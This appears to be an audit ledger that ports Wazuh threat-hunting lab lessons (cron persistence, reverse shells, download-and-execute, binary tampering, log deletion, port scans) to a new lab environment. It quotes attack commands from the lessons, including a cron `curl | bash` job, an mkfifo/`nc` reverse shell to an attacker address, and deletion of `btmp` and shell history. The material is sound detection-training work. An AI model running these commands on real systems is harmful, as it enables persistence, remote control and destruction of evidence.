# Ledger E — wazuh-threat-hunting, case-24 … case-30

Source: `/home/ccc/xocrange/contents/academy/wazuh-threat-hunting/lessons/case-2[4-9]`, `case-30` (`lesson.json`, `explanation.json`, `missions.json` read in full). Audit date 2026-11-18. Read-only.

## How statuses were established

- **Office PC** facts come from the repository at commit `01faffb` (`components/office-pc/Dockerfile`, `ossec.conf`, `start.sh`, `compose.yaml`, `components/security-path/fw/rules.nft`, `ips/rules.nft`). It is not deployed on the demo Core (`agent.name: "office-pc01"` → 0 alerts), so everything about it is "by code", not run.
- **Manager / index** facts come from live read-only checks on demo Core 192.168.16.52 (7-day window, `dql` helper, `rule.sh`, `ossec.conf`).
- Status words: `same`, `renamed -> X`, `missing`, `unverified`.

### Live results used throughout

| Check | Result |
|---|---|
| Rules 550, 553, 554, 591, 5715, 5402, 533, 4101, 4151, 80792, 80700, 2830-2834, 5501/5502 | all exist in the Manager ruleset (stock) |
| `rule.groups: "syscheck"` (alerts, 7 d) | 0 hits |
| `rule.groups: "audit_command"`, `_exists_:data.audit.execve.a0` (alerts, 7 d) | 0 hits each |
| `location: *auditd` (alerts) | 2,860 hits; rules 80730 etc. and Core's own 110006 (`location: xoc-c1`, `data.audit.key: xoc_privilege`); fields `data.audit.auid/cwd/exe/command` exist, **no `execve.aN`** |
| Host audit rules (`components/siem/audit.rules`) | only `-w /etc/xocrange -k xoc_config`, `-w /usr/bin/sudo -p x -k xoc_privilege`, `-w /usr/bin/true -p x -k xoc_probe`. No `-S execve -k audit-wazuh-c` rule |
| `location: *sysmon` (alerts) | 708,645 hits; rule 111201 (process creation, `data.sysmon_linux.eventdata.Image/CommandLine/CurrentDirectory`), 111203 (network connection, `DestinationIp/DestinationPort`), 111211 (file creation) |
| `_exists_:data.osquery.name` | 79,354 hits, rule 24010, but only `core_sensor` / `core_processes`; `data.osquery.name: *listen* OR *port*` → 0 |
| `rule.id: "533"` | 0 hits; no `full_command` netstat localfile in Manager `ossec.conf` or in the office PC `ossec.conf` |
| `rule.id: "4151" OR rule.groups: "firewall_drop"`, `rule.groups: "firewall"`, `location: *nftables`, `decoder.name: "xoc-nftables"`, `data.action: DROP/ACCEPT` (alerts) | 0 hits each in 7 days |
| archives index, `_exists_:location` and `*` (7 d) | **0 hits** — the archives index returned no documents at all through the helper, although the Manager has `logall_json yes` |
| Manager `ossec.conf` | no `<localfile>`, no `<active-response>`, `syscheck` only `/etc` at 12 h on the Manager itself, rootcheck/SCA off |
| Host coreutils | Sysmon/auditd samples show `/usr/lib/cargo/bin/coreutils/who`, `/usr/lib/cargo/bin/coreutils/cat` → Ubuntu 26.04 uses the Rust coreutils; `/usr/bin/<tool>` is very likely a link into `/usr/lib/cargo/bin/coreutils/` |

### Things common to all seven lessons

| Item | Where | Status | Note |
|---|---|---|---|
| Index pattern `wazuh-alerts-*` | every slide "검색 준비", every query `where` | same | matches `wazuh-alerts-4.x-*` |
| `Windows · Discover` (analyst browser on a Windows PC) | every query `where` | missing | no Windows endpoint; Discover is at `https://<core>/siem/` from the learner's browser. Wording change only |
| `agent.name` column / filter | all slides, all queries | renamed | today every alert is `xoc-manager`; office PC alerts will be `office-pc01`. `bastion`, `web`, `xocrange-host` do not exist |
| Account `ccc` (uid 1000, auid 1000) | commands, tables | renamed -> `student` on the office PC | home `/home/ccc` -> `/home/student`; the uid of `student` is unverified |
| Attacker VM `att@attacker`, 192.168.0.202 | slide command captures, C09-22..25, C10-08..10 | renamed -> external attacker VM (address differs) | has curl, nmap, ssh, python3, nc |
| "xOC Range VM" 192.168.0.189 (also 192.168.0.108 in one recorded value), NIC `ens33`, hostname `ccc.com` | commands, slide captures | renamed -> `<core address>` | learners had a `ccc` shell with sudo and docker on the lab VM itself. Whether Core learners get a shell on the Core host is **not** part of the stated Core facts — treated as missing |
| Bastion SSH `ssh -p 2204 ccc@192.168.0.189` | slide capture p.279 (seen in image) | renamed -> `ssh -p 2222 student@<core address>` | |
| Slide images | pages "실습 ① 공격 실행" and "결과 화면 ①②③" | — | all are captures of the old lab (terminal capture with `att@attacker`, old addresses; Discover result captures with old agent names). The three terminal captures I opened (p.279, p.289, p.333) show the literal strings `kt66-update`, `kt66-host`, `kt66 호스트` — forbidden on user screens by CLAUDE.md. The other 27 slide images were not opened |
| Slide vs manuscript | — | — | slides (older "DQL 예시집") and `explanation.json` (REV01 manuscript) describe **different commands** for the same case (noted per lesson). Both need porting |
| `missions.json` | — | same | self-record only, no environment dependency except `source_pages` |

---

## case-24 — cron 지속화 (manuscript 9.4, slides p.278-285)

**1. Summary.** The learner drops a one-line job into `/etc/cron.d/` on the bastion, finds the FIM "file added" alert (554), proves execution from the result file and the syslog `CMD` line, then removes it (553).

**2. Environment assumptions**

| Assumption | Where | Status | Note |
|---|---|---|---|
| Host `bastion`, container `xocrange-bastion` | C09-17..21, Q09-05, prose | renamed -> `office-pc01` | |
| "root 관리 셸" on the bastion (docker exec from lab VM) | C09-17, C09-18, prose (restore) | renamed -> `sudo` in the student SSH session | sudo is NOPASSWD; the office PC container name on the Core host is unverified |
| Account `ccc` SSH shell | C09-19..21 | renamed -> `student` | |
| cron package + running daemon | C09-17 | same (by code) | Dockerfile installs `cron`, `start.sh` runs `cron`. Manuscript says the old bastion had **no** cron ("기록 환경도 cron이 없어") — text must change |
| `service cron status` | C09-17 | unverified | `service`/init script presence and pidfile check in the image not run; cron is started directly, not via the init script |
| `apt-get update/install cron` | C09-18 | missing | office PC has no outbound path to package mirrors; step is unnecessary now and must be dropped |
| `/etc/cron.d/book09-lab`, `/tmp/book09-cron-result` | C09-19..21, Q09-05 | same | `/etc` is realtime + `check_all` in the agent config |
| `sudo tee`, `sudo rm`, `sudo cat` | C09-19, C09-21 | same | |
| `/var/log/syslog` with `CRON[...]: (root) CMD (...)` | C09-20, prose | same (by code) | rsyslog writes syslog; agent also collects it, so cron lines reach the Manager (bonus not used by the lesson) |
| auth.log has cron session open/close | prose | same (by code) | PAM for cron is kept (`pam_loginuid` made optional) |
| FIM rules 554 (added), 553 (deleted) | Q09-05, C09-21, slide p.285 | same | rules exist; no syscheck alert has ever been produced on the demo (0 hits) |
| "추가 경보에는 diff가 없다" | Q09-05, prose | same | consistent with the office agent: no `report_changes` |
| `syscheck.diff` shows `curl … | bash` | slides p.278, p.281 (column), p.285 | missing | no `report_changes` on `/etc`; the slide claim needs `report_changes="yes"` (diff then appears on *modification*, not on add) |
| `/var/spool/cron*` monitored | slide p.278, p.281 DQL | missing | not in the office agent `directories` |
| `/etc/systemd/system/*.timer` | slide p.281 DQL | same (covered by `/etc`) | no systemd in the container; harmless |
| Slide attack: `ssh -p 2204 ccc@192.168.0.189 'echo "* * * * * root curl -s http://192.168.0.202:8000/x.sh | bash" | sudo tee /etc/cron.d/kt66-update'` | slide p.279 image, p.280 | renamed + partly missing | port/account/host rename; file name contains `kt66`; the cron job's `curl` to the attacker:8000 cannot leave the office PC (only 10.20.32.80:8080 allowed) |
| Recorded time 07:51:42 | Q09-05 | — | recorded value, re-record |

**3. Commands**

| id | where | tool | Runs in Core + office PC? |
|---|---|---|---|
| C09-17 | bastion root shell | `command -v`, `service` | needs rename (office PC, `sudo`); `service cron status` unverified |
| C09-18 | bastion root shell | `apt-get`, `service` | no — no package mirror reachable; remove (cron is preinstalled) |
| C09-19 | bastion `ccc` SSH | `printf`, `sudo tee` | yes after rename |
| C09-20 | bastion `ccc` SSH | `date`, `cat`, `grep /var/log/syslog` | yes after rename (`/var/log/syslog` is `syslog:adm`; `student` may need `sudo grep` — group membership unverified) |
| C09-21 | bastion `ccc` SSH | `sudo cat/rm`, `ls` | yes after rename |
| slide p.279 | attacker VM | `ssh -p 2204`, `sudo tee` | needs rename (`-p 2222 student@<core>`); payload URL unreachable from the PC |

**4. Queries**

| id | index | fields / rules | Returns data in Core? |
|---|---|---|---|
| Q09-05 | alerts | `agent.name: "bastion"`, `syscheck.path`; expects 554 then 553 | after rename to `office-pc01`: yes by configuration (unverified live — agent not deployed, 0 syscheck alerts today) |
| slide p.281 | alerts | `rule.groups:syscheck`, `syscheck.path:(/etc/cron* …)`, columns `syscheck.event`, `syscheck.diff` | yes for `/etc/cron*`; `syscheck.diff` empty; `/var/spool/cron*` never |

**5. Images.** Slides 4 (1 terminal capture of the old attacker VM, 3 Discover captures of the old lab; no `path` field). Manuscript 1, path contains `screens` (`assets/screens/chapter09/cron-fields.png`). Diagrams: 0.

**6. Blocking gaps.** None for the manuscript flow once renamed and C09-18 is dropped. For the slide flow: `report_changes` on `/etc/cron.d` (to show `syscheck.diff`), `/var/spool/cron` in FIM, and a reachable URL if the `curl | bash` job is to be real.

---

## case-25 — 네트워크 도구 실행 흔적 / 리버스 셸 (manuscript 9.5, slides p.286-296)

**1. Summary.** The learner listens with `nc` on the attacker VM, runs `nc` on the lab host to connect out to it, and finds the auditd EXECVE alert (80792) with the program, arguments, auid and cwd.

**2. Environment assumptions**

| Assumption | Where | Status | Note |
|---|---|---|---|
| Victim = "xOC Range VM · 터미널" (lab host, `ccc`) | C09-23, prose | missing / renamed -> `office-pc01` | no stated learner shell on the Core host; the natural target is the office PC |
| Agent `xocrange-host` | Q09-06, slides p.286, p.296 | renamed -> `office-pc01` (or `xoc-manager` + `location: */auditd` if the Core host is used) | |
| auditd on the victim with `-a exit,always -F arch=b64 -S execve -k audit-wazuh-c`, restricted to `auid>=1000` | slides p.286, p.288; Q09-06 | missing | office PC: no auditd. Core host: auditd present but only three watch rules (`xoc_config`, `xoc_privilege`, `xoc_probe`); no execve rule |
| Rule 80792, group `audit_command`, list `etc/lists/audit-keys` | Q09-06, slides | same (rule + list configured) | 0 alerts in 7 days because no audit key maps to `command` |
| Fields `data.audit.execve.a0..a3`, `data.audit.exe`, `auid`, `euid`, `pid`, `ppid`, `session`, `cwd`, `success`, `exit`, `id` | Q09-06, table, slides p.287-296 | missing (`execve.*`), same (`auid`, `cwd`, `exe` exist on other audit alerts) | `_exists_:data.audit.execve.a0` → 0 |
| `nc` (netcat-openbsd, `/usr/bin/nc.openbsd`, `-N`) on the victim | C09-23, prose, slide p.291/296 | missing | not in the office PC Dockerfile |
| `nc -lvn 4444` / `nc -lvnp 4444` on the attacker | C09-22, slide p.289 | same | attacker VM has nc; `timeout` is coreutils |
| Outbound TCP from victim to attacker 192.168.0.202:4444 | C09-23, slide p.289 | missing | office PC may only reach 10.20.32.80:8080 and the Manager agent port; fw/ips forward policy is drop |
| `sudo ausearch -a <id> -i` on the victim | prose | missing | no auditd in the PC |
| Slide attack: `ssh ccc@192.168.0.189 "mkfifo /tmp/.f; cat /tmp/.f | bash -i 2>&1 | nc 192.168.0.202 4444 > /tmp/.f"` (real reverse shell, direct SSH to host port 22) | slide p.289-291 | renamed + missing | `ssh -p 2222 student@<core>`; nc missing; outbound blocked; title bar shows `kt66-host` |
| `mkfifo`, `bash -i`, `/dev/tcp` | slides | same (tools exist) | connection still blocked |
| "auditd 는 xocrange-host 에 설치" note | slide p.296 | missing | describes the old host |
| Recorded values (pid 172438, session 82, 192.168.0.108) | table, Q09-06 | — | re-record |

**3. Commands**

| id | where | tool | Runs in Core + office PC? |
|---|---|---|---|
| C09-22 | attacker VM | `timeout`, `nc -lvn` | yes |
| C09-23 | lab host (`ccc`) | `printf`, `nc -N` | tool missing (nc) **and** feature missing (no outbound path to the attacker) |
| slide p.289/290 | attacker VM → host via ssh | `ssh`, `mkfifo`, `bash -i`, `nc` | needs rename; tool missing; outbound blocked |

**4. Queries**

| id | index | fields / rules | Returns data in Core? |
|---|---|---|---|
| Q09-06 | alerts | `agent.name: "xocrange-host"`, `rule.groups: "audit_command"`, `data.audit.execve.a0: "nc"`; expects 80792 | no — agent name gone, no execve audit rule anywhere, field absent |
| slide p.292 | alerts | `rule.groups:audit_command`, `data.audit.exe`, `data.audit.execve.a0/a1/a2` | no (same reasons) |

Possible substitute already live on the Core host: Sysmon for Linux rule 111201 (`data.sysmon_linux.eventdata.Image`, `CommandLine`, `CurrentDirectory`) and 111203 (`DestinationIp`, `DestinationPort`). Host Sysmon already records container-side processes (e.g. `runc init`); whether it records processes of the office PC container with usable user/cwd values is unverified.

**5. Images.** Slides 5 (2 terminal captures, 3 Discover captures; all old lab). Manuscript 1, `screens` (`chapter09/reverse-fields.png`). Diagrams: 0 (concept pages p.286-287 are text only).

**6. Blocking gaps.**
- A process-execution record for the office PC: either an execve audit rule with key `audit-wazuh-c` visible to a collector (kernel audit is host-wide, so this means a host audit rule plus a way to attribute it to the PC), or a decision to teach this case with Sysmon fields instead.
- `netcat-openbsd` in the office PC image.
- A network path from the office PC to a listener (attacker VM port, or an in-lab listener), otherwise only a *failed* connection attempt can be shown.

---

## case-26 — 다운로드 후 실행 (manuscript 9.6, slides p.297-304)

**1. Summary.** The learner serves a harmless script from the attacker VM, runs `curl … | sh` on the lab host, and reconstructs the pipe from audit execution records (curl and sh as siblings, `id`/`hostname` as children of sh).

**2. Environment assumptions**

| Assumption | Where | Status | Note |
|---|---|---|---|
| Victim = lab host terminal, account `ccc` | C09-26, C09-27 | missing / renamed -> `office-pc01`, `student` | |
| Attacker VM working dir `~/book09`, `python3 -m http.server 8000 --bind 192.168.0.202` | C09-24, C09-25, slide p.299 | same (address differs) | python3 is on the attacker VM |
| Victim reaches `http://192.168.0.202:8000/a.sh` | C09-26, C09-27, Q09-07 result | missing | office PC outbound is limited to the web gateway 10.20.32.80:8080 |
| `curl` on the victim | C09-26, C09-27 | same | in the Dockerfile |
| `sh` = dash, `bash` `PIPESTATUS`, `id`, `hostname` | C09-27, table, prose | same / unverified | bash is the account shell; `/usr/bin/id` and `/usr/bin/hostname` paths may be Rust-coreutils links on 26.04 (table values `/usr/bin/id`, `/usr/bin/hostname`, `/usr/bin/dash` need re-recording) |
| Agent `xocrange-host` | Q09-07, Q09-08 | renamed -> `office-pc01` | |
| auditd execve rule, rule 80792, `audit_command` | Q09-07, Q09-08, slides p.297-304 | missing | as case-25 |
| Fields `data.audit.execve.a0..a4`, `data.audit.session`, `pid`, `ppid`, `exe`, `auid`, `cwd` | Q09-07, Q09-08, table, slides | missing | |
| Web server request record as second evidence ("웹 서버의 요청 기록") | prose | same in spirit | in the old lab this was the attacker's `http.server` console; in Core a download through the web gateway would additionally appear under `location: */apache-access` |
| "FIM에는 남지 않는다" | prose | same | |
| "auditd 를 xocrange-host 에 설치" | slide p.304 | missing | |
| Recorded values (session 87, pids 172868-172872) | Q09-08, table | — | re-record |

**3. Commands**

| id | where | tool | Runs in Core + office PC? |
|---|---|---|---|
| C09-24 | attacker VM | `cat` here-doc | yes |
| C09-25 | attacker VM | `python3 -m http.server` | yes (bind address changes) — but nothing in the lab can reach it |
| C09-26 | lab host | `curl` | feature missing: no path from the office PC to attacker:8000 |
| C09-27 | lab host | `curl | sh`, `PIPESTATUS` | feature missing (same) |
| slide p.298 | attacker VM | (capture not opened; p.299 gives `python3 -m http.server 8000`, `curl -s http://…/a.sh | sh`) | same gaps |

**4. Queries**

| id | index | fields / rules | Returns data in Core? |
|---|---|---|---|
| Q09-07 | alerts | `agent.name: "xocrange-host"`, `audit_command`, `data.audit.execve.a0: "curl"` | no |
| Q09-08 | alerts | `agent.name`, `audit_command`, `data.audit.session: "87"` | no |
| slide p.300 | alerts | `audit_command`, `data.audit.execve.a0:(curl or wget)`, `a1/a2:*http*` | no (and the manuscript itself notes the URL is in `a4`) |

**5. Images.** Slides 4 (1 terminal capture, 3 Discover captures; old lab; the p.303 capture is the same asset as case-25 p.295). Manuscript 1, `screens` (`chapter09/download-fields.png`). Diagrams: 0.

**6. Blocking gaps.**
- Execution records with parent/child and session linkage for the office PC (auditd execve, or Sysmon `ProcessId`/`ParentProcessId` — unverified).
- A place to host `a.sh` that the office PC can reach: a file served behind the web gateway (10.20.32.80:8080), or a new allowed path to the attacker VM.

---

## case-27 — 시스템 바이너리 변경 (manuscript 9.7, slides p.305-312)

**1. Summary.** The learner appends 7 bytes to `/usr/bin/yes` in the web container, sees the FIM 550 alert with size and SHA-256 before/after, confirms with `dpkg -V coreutils`, then restores the file (a second 550).

**2. Environment assumptions**

| Assumption | Where | Status | Note |
|---|---|---|---|
| `docker exec -it xocrange-web /bin/bash` from the lab VM | C09-28 | renamed -> `xoc-core-security-path-web-1`, but **wrong target** | needs a host shell with docker; the Core web container has no Wazuh agent and no FIM. Move the exercise to `office-pc01` (`ssh -p 2222 student@<core>`, `sudo`) |
| Agent `web` with FIM `realtime` on `/usr/bin` (and `/usr/sbin`) | Q09-09, prose, slide p.312 | renamed -> `office-pc01` | office agent: `realtime="yes" check_all="yes"` on `/usr/bin,/usr/sbin` |
| Root shell, backup at `/root/book09-yes.before` (slide: `/root/yes.orig`) | C09-29..31, slide p.307 | same with `sudo` | `/root` is not monitored — fine |
| `/usr/bin/yes` is a regular 31,112-byte coreutils file | C09-29, C09-30, Q09-09 | **unverified, probably different** | Ubuntu 26.04 ships Rust coreutils (host shows `/usr/lib/cargo/bin/coreutils/<tool>`). If `/usr/bin/yes` is a link, `>>` changes a file outside `/usr/bin`, FIM on `/usr/bin` stays silent, `cp -p` backup/restore semantics change. Must be checked on the built image; choose a regular file under `/usr/bin` if so |
| `dpkg -V coreutils` prints `??5?????? /usr/bin/yes` | C09-30 | unverified | owning package may be `rust-coreutils`/`coreutils-from-uutils`, path may differ. "missing 줄은 문서 파일이 이미지에 없다" also image-specific |
| `stat`, `sha256sum`, `cmp`, `cp -p`, `printf '\x00…'` | C09-29..31 | same | |
| Rule 550, fields `syscheck.path`, `size_before/after`, `sha256_before/after` | Q09-09, slides p.305-312 | same | `check_all` gives sizes and hashes |
| "report_changes가 없어 diff가 없다" | prose | same | |
| Slide DQL path list `/bin/* /sbin/* /lib/* /usr/lib/*` | slide p.308 | partly missing | only `/usr/bin`, `/usr/sbin` monitored; `/bin` is a link to `/usr/bin` so events carry `/usr/bin/...`; `/usr/lib` (where the Rust coreutils binaries live) is not monitored |
| `debsums`, `rpm -V` | slides p.305, p.312 | missing (not installed) | prose mention only |
| "xOC Range 보강: /usr/bin·/usr/sbin 실시간 감시 추가" | slide p.312 | same | |
| Slide marker string `'\x00xOC Range'` vs manuscript `'\x00BOOK09'` | slide p.307 vs C09-30 | — | slide and manuscript differ |

**3. Commands**

| id | where | tool | Runs in Core + office PC? |
|---|---|---|---|
| C09-28 | lab VM terminal | `docker exec` | no as written (host shell + agent-less container). Replace with SSH to the office PC + `sudo -i` |
| C09-29 | web root shell | `ls`, `stat`, `sha256sum`, `cp -p`, `cmp` | yes on the office PC with sudo; recorded size/hash change; link question open |
| C09-30 | web root shell | `printf >>`, `stat`, `sha256sum`, `dpkg -V` | yes with sudo; outcome unverified (Rust coreutils) |
| C09-31 | web root shell | `cp -p`, `cmp`, `sha256sum`, `rm`, `exit` | yes with sudo |
| slide p.306 | attacker VM (capture not opened) | per p.307: `printf >> /usr/bin/yes`, `cp /root/yes.orig /usr/bin/yes` | needs rename |

**4. Queries**

| id | index | fields / rules | Returns data in Core? |
|---|---|---|---|
| Q09-09 | alerts | `agent.name: "web"`, `syscheck.path: "/usr/bin/yes"`; expects 550 ×2 | after rename to `office-pc01`: yes if `/usr/bin/yes` is a regular file there (unverified) |
| slide p.308 | alerts | `rule.id:550`, `syscheck.path:(/bin/* … /usr/lib/*)`, `sha256_before/after` | yes for `/usr/bin/*`, `/usr/sbin/*` only |

**5. Images.** Slides 4 (1 terminal, 3 Discover; old lab). Manuscript 1, `screens` (`chapter09/binary-fields.png`). Diagrams: 0.

**6. Blocking gaps.** No Manager change needed. Office PC: confirm (or provide) a regular-file binary under `/usr/bin` owned by a dpkg package so both the 550 alert and `dpkg -V` work; otherwise add `follow_symbolic_link`/`/usr/lib/cargo` monitoring or pick another file.

---

## case-28 — 로그 삭제·변경 (manuscript 9.8, slides p.313-321)

**1. Summary.** The learner creates a copy of `btmp` under `/var/log` and a mock `.bash_history` under the home directory on the bastion, empties one and deletes the other, and compares the FIM alerts (554/550 with diff/553) that two differently configured monitored paths produce.

**2. Environment assumptions**

| Assumption | Where | Status | Note |
|---|---|---|---|
| Host `bastion`, `ccc` SSH shell, "공격자 VM으로 돌아온다" on exit | C09-32..34 | renamed -> `office-pc01`, `student`, `ssh -p 2222` from the attacker VM | |
| `/home/ccc/book09-history/.bash_history` | C09-32..34, Q09-10 | renamed -> `/home/student/…` | `/home` is realtime + `check_all` (volume `office-home`) |
| `/home` FIM "속성까지 비교" → 550 with size 20→0 | Q09-10, prose | same | |
| `/home` FIM diff `1d0 < echo book09-history` | Q09-10 result | missing | needs `report_changes="yes"` on `/home` (or on that directory) |
| `/var/log/btmp` exists | C09-32, C09-34, slide p.315 | unverified | image is Ubuntu 26.04 with `/var/log` on a volume; presence of `btmp` not checked |
| `/var/log/book09-btmp` monitored: FIM on `/var/log` with `check_all="no"`, create/delete only, realtime | C09-32/33, Q09-10, prose, slide p.321 | missing | `/var/log` is not in the office agent `directories` → no 554/553 for the btmp copy |
| Rules 554, 550, 553 | Q09-10 | same | |
| Rule 591 (log rotated) | slide p.313 | same (rule exists) | fires from logcollector on the collected files |
| Rules 5715 (sshd success), 5402 (sudo to root) on the same host just before | slides p.313, p.321 | same (by code) | auth.log is collected by the office agent; sshd `LogLevel INFO`, sudo logs through rsyslog; alerts will carry `agent.name: office-pc01`. Unverified live |
| "이미 Wazuh로 보낸 로그는 인덱서에 남아 있다" | prose | same | only alert-level lines are in the alerts index; raw lines need the archives index (0 documents today) |
| logrotate present | prose | unverified | not installed explicitly in the Dockerfile |
| Slide attack `> ~/.bash_history`, `sudo rm /var/log/btmp` on the real files | slide p.315 | renamed / missing | real `~/.bash_history` under `/home/student` is monitored; `/var/log/btmp` is not |
| "xOC Range 보강: /var/log 를 생성·삭제만 실시간 감시" | slide p.321 | missing | |

**3. Commands**

| id | where | tool | Runs in Core + office PC? |
|---|---|---|---|
| C09-32 | bastion `ccc` SSH | `mkdir -m`, `printf`, `sudo cp -p`, `sudo sha256sum` | yes after rename (if `/var/log/btmp` exists); the `/var/log` half produces no alert |
| C09-33 | bastion `ccc` SSH | `>`, `sudo rm`, `stat` | yes after rename; 553 for the btmp copy will not appear |
| C09-34 | bastion `ccc` SSH | `sudo sha256sum`, `rm`, `rmdir`, `exit` | yes after rename |
| slide p.314 | attacker VM (capture not opened) | per p.315: `> ~/.bash_history`, `sudo rm /var/log/btmp` | needs rename; deleting the real btmp is destructive on a shared PC |

**4. Queries**

| id | index | fields / rules | Returns data in Core? |
|---|---|---|---|
| Q09-10 | alerts | `agent.name: "bastion"`, two `syscheck.path` values; expects 554×2, 550 (with diff), 553 (+553 on cleanup) | after rename: only the `/home/student/...` half (554, 550 without diff, 553). The `/var/log/book09-btmp` half returns nothing |
| slide p.316 | alerts | `rule.id:553 AND syscheck.path:/var/log/*`, `syscheck.path:*bash_history*`, `syscheck.event` | `bash_history` half yes; `/var/log/*` half no |

**5. Images.** Slides 5 (1 terminal, 4 Discover; old lab). Manuscript 2, both `screens` (`chapter09/history-fields.png`, `chapter09/logdelete-fields.png`). Diagrams: 0.

**6. Blocking gaps.** Office agent FIM: add `/var/log` with `check_all="no"` (create/delete only, realtime) and `report_changes="yes"` for the home path. Confirm `/var/log/btmp` exists in the PC. The whole teaching point (two paths, two settings) disappears without the `/var/log` entry.

---

## case-29 — 새 수신 대기 포트 (manuscript 10.2, slides p.322-329)

**1. Summary.** The learner opens a listener with `nc -lk <addr> 31337` on the lab host and compares when three sources report it: the audit execution alert (immediately), the osquery listening-ports query (within 1 min) and the netstat command-monitoring alert 533 (within 6 min).

**2. Environment assumptions**

| Assumption | Where | Status | Note |
|---|---|---|---|
| Victim = lab host, three terminals A/B/C, account `ccc` | C10-04..06, prose | missing / renamed -> three SSH sessions to `office-pc01` | |
| Bind address 192.168.0.189 | C10-05, C10-06, Q10-03 result | renamed -> 10.20.70.21 | |
| `nc` (`-lk`, `/usr/bin/nc.openbsd`) on the victim | C10-05, C10-06, slide p.324 | missing | not in the office PC image |
| `sudo ss -lntp 'sport = :31337'` | C10-04, C10-06 | same | `iproute2` installed; reading sockets needs no NET_ADMIN |
| `ps -C nc -o …` | C10-06 | same | `procps` installed |
| Agent `xocrange-host` | Q10-01..03 | renamed -> `office-pc01` | |
| auditd execve → rule 80792, `data.audit.execve.a0..a3`, pid | Q10-01 | missing | as case-25 |
| osquery scheduled query `xocrange_listening_ports` (1 min), fields `data.osquery.name/action/columns.port/columns.name/columns.path` | Q10-02, slide p.329 | missing | no osquery in the PC; the host osquery schedule has only `core_processes` and `core_sensor` (rule 24010, `agent.name: xoc-manager`) |
| netstat command monitoring every 6 min (`full_command`, alias `netstat listening ports`), rule 533, `full_log`, `previous_output` | Q10-03, slides p.322-329 | missing | rule 533 exists; no such `<localfile>` in the office agent or the Manager; 0 alerts |
| `net-tools` (`netstat`) on the monitored host | slide p.329 | missing | not in the Dockerfile |
| Slide field `data.extra_data` | slide p.322 | unverified | manuscript uses `full_log` / `previous_output` instead |
| "10.3에서 경계 방화벽 규칙을 읽고 답한다" (is 31337 reachable from outside?) | predict box, C10-05 "10.5까지 그대로 둔다" | renamed | in Core the answer comes from the fw container's forward chain (only 10.20.70.21:22 is forwarded), not a host perimeter chain |
| Cross-reference to case 62 (osquery) and case 25 | slide p.322, p.329 | — | other lessons |
| Recorded times 08:36:55 / 08:37:01 / 08:42:21, pid 181571 | Q10-01..03 | — | re-record |

**3. Commands**

| id | where | tool | Runs in Core + office PC? |
|---|---|---|---|
| C10-04 | lab host | `sudo ss` | yes after rename |
| C10-05 | lab host, terminal A | `nc -lk` | tool missing (nc); address rename |
| C10-06 | lab host | `sudo ss`, `ps` | yes after rename (nothing to show without nc) |
| slide p.323 | attacker VM (capture not opened) | per p.324: `nc -lk 31337 &` | tool missing; needs rename |

**4. Queries**

| id | index | fields / rules | Returns data in Core? |
|---|---|---|---|
| Q10-01 | alerts | `agent.name: "xocrange-host"`, `audit_command`, `data.audit.execve.a0: "nc"` (80792) | no |
| Q10-02 | alerts | `agent.name`, `data.osquery.name: "xocrange_listening_ports"` | no (field exists, value does not) |
| Q10-03 | alerts | `agent.name`, `rule.id: "533"` | no (rule exists, no command monitoring configured) |
| slide p.325 | alerts | `rule.id:533`, `full_log` | no |

**5. Images.** Slides 4 (1 terminal, 3 Discover; old lab). Manuscript 1, `screens` (`chapter10/ports.png`). Diagrams: 0.

**6. Blocking gaps.** All three evidence sources are absent for the office PC. Minimum to keep the lesson: `netcat-openbsd` + `net-tools` in the image and a `full_command` netstat localfile (frequency 360, alias `netstat listening ports`) in the office agent → restores Q10-03. Q10-01 needs execution records (see case-25). Q10-02 needs osquery with a listening-ports query on the PC, or must be dropped/re-pointed.

---

## case-30 — 포트 스캔과 방화벽 드롭 (manuscript 10.3, slides p.330-339)

**1. Summary.** The learner reads the host perimeter firewall chain, scans TCP 1-1000 of the lab VM with Nmap from the attacker VM, reads the kernel DROP lines, finds the aggregated alert 4151, then counts individual drops in the archives index (Discover and Dev Tools) and reasons about the log rate limit.

**2. Environment assumptions**

| Assumption | Where | Status | Note |
|---|---|---|---|
| Perimeter firewall = iptables on the lab host, chain `xocrange-PERIMETER`, service `xocrange-perimeter` | C10-07, prose, slides p.330, p.339 | renamed -> nftables table `inet xoc_fw` in container `xoc-core-security-path-fw-1` (10.20.30.1) | different tool, different place; the office PC has no packet filter and no NET_ADMIN |
| Learner can read the rules with `sudo iptables -S` | C10-07 | missing | needs a shell in the fw container (`nft list table inet xoc_fw`) or a rules view in the platform UI (unverified) |
| Rule shape: per-port `RETURN`, `-m limit --limit 100/s --limit-burst 200 -j LOG --log-prefix "DROP "`, then `DROP`; exception list built from listening ports | C10-07 result, prose, blind box | renamed | Core: `limit rate 10/second burst 20 packets log prefix "[xoc-fw] DROP " group 10` (NFLOG) then `drop`; forward policy drop with fixed allow rules. All arithmetic in the blind box (200 + 100/s × 4.9 ≈ 690, 592 recorded) must be redone with 20 + 10/s |
| Scan target = lab VM 192.168.0.189, ports 1-1000; result 993 filtered, open 22/25/53/80/443/587/993 | C10-09, slides p.333-334 | renamed, **semantics differ** | scanning `<core address>` hits the Core host's own ports; only published ports go to ingress → fw. Unpublished ports never reach the lab firewall, so they produce no `[xoc-fw] DROP` record. The open-port list will differ |
| Scan source visible as `SRC=<attacker>` in the firewall record | C10-10, Q10-05, D10-01, slide p.331 | unverified | traffic reaches fw via the `ingress` container; fw rules match `ip saddr 10.20.30.0/24`, so the recorded source is probably an ext-network address, not the attacker's |
| `nmap` 7.80 on the attacker VM (installed by C01-24) | C10-08, C10-09 | same (version differs) | attacker VM has nmap; "Nmap version 7.80" text changes |
| `/var/log/kern.log` on the lab host, lines `kernel: DROP IN=ens33 … SRC= DST= PROTO=TCP SPT= DPT= SYN` | C10-10, slide p.331, p.339 | missing -> NFLOG records from the fw container | Core reads NFLOG group 10 with `fw/nflog.py`; prefix is `[xoc-fw] DROP `; no `kern.log` (the office PC even disables `imklog`) |
| Agent `xocrange-host`, `agent.ip` 10.20.32.254 | Q10-04, Q10-05, D10-01, prose | renamed -> `xoc-manager` (id 000) + `location: xoc-native/<id>/nftables` | `agent.ip` does not exist for id 000 |
| `location: "/var/log/kern.log"` | Q10-05 | renamed -> `location: */nftables` | |
| Rules 4100/4101 (`no_log`) and 4151 (18 in 45 s, ignore 240, level 10), group `firewall_drop` | Q10-04, slides p.331-339 | same (rules exist) / unverified (chain) | Core decoder `xoc-nftables` (type firewall) extracts `action, srcip, dstip, protocol, srcport, dstport`, so 4100→4101→4151 should chain; **0** firewall-group alerts, 0 nftables-location alerts in 7 days on the demo |
| Fields `data.srcip`, `data.dstport`, `data.action`, `data.dstip` | Q10-04, Q10-05, D10-01, slides | same by decoder / unverified live | no document with these fields from nftables found |
